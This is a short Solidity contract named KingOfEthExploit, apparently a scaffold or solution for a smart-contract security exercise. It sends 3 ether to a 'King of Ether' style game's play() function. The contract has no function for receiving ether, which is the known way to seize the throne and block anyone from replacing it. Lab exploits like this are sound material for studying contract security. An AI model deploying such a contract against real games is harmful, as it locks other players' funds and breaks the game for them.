// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

interface IKingOfEth {
    function play() external payable;
}

contract KingOfEthExploit {
    IKingOfEth public target;

    constructor(address _target) {
        target = IKingOfEth(_target);
    }

    function pwn() external payable {
        // write your code here
        target.play{value: 3 ether}();
    }
}